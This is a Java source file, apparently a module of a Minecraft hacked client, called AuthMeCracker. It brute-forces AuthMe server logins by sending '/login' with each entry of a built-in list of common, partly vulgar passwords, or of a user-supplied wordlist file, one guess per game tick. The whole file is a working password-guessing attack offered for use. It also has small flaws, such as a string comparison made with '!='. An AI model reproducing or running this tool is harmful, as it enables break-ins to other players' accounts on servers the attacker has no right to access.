package de.chrissx.mods.chat;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import de.chrissx.mods.Mod;
import de.chrissx.util.Consts;
import de.chrissx.util.Util;

public class AuthMeCrack extends Mod {

	public static final String[] DEFAULT_AUTHME = {
			"password", "passwort", "password1", "passwort1",
			"password123", "passwort123", "pass", "pw",
			"pw1", "pw123", "123", "1234", "12345",
			"123456", "1234567", "12345678", "123456789",
			"login", "register", "test", "sicher",
			"safe", "me", "ich", "penis", "penis1",
			"penis12", "penis123", "minecraft", "minecraft1",
			"minecraft12", "minecraft123", "mc", "admin",
			"server", "yourmom", "tester", "account",
			"creeper", "gronkh", "lol", "lel", "kek",
			"auth", "authme", "qwerty", "qwertz",
			"ficken", "ficken1", "ficken12", "ficken123",
			"fuck", "fuckme", "fuckyou" };

	List<String> pws;

	File pwFile = Paths.get(Consts.configPath, "authmecracker.cfg").toFile();

	int times = 0;

	public AuthMeCrack() {
		super("AuthMeCracker");
		if(pwFile.exists()) {
			try {
				List<String> pwsL = new ArrayList<String>();
				BufferedReader reader;
				reader = new BufferedReader(new FileReader(pwFile));
				String s = "";
				while((s = reader.readLine()) != "" && s != null)
					pwsL.add(s);
				reader.close();
				pws = pwsL;
			} catch (Exception e) {
				e.printStackTrace();
			}
		}else
			pws = Arrays.asList(DEFAULT_AUTHME);
	}

	@Override
	public void onTick() {
		if(enabled && times != 0) {
			Util.sendChat("/login " + pws.get(times - 1));
			times--;
		}else {
			enabled = false;
			times = 0;
		}
	}

	@Override
	public void toggle() {
		enabled = true;
		times = pws.size();
	}

	@Override
	public void onStop() {
		try {
			if(!pwFile.exists()) pwFile.createNewFile();
			if(pws.size() == 0) return;
			BufferedWriter writer = new BufferedWriter(new FileWriter(pwFile));
			writer.write(pws.get(0));
			for(int i = 1; i < pws.size(); i++) {
				writer.newLine();
				writer.write(pws.get(i));
			}
			writer.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void addPw(String pw) {
		pws.add(pw);
	}
}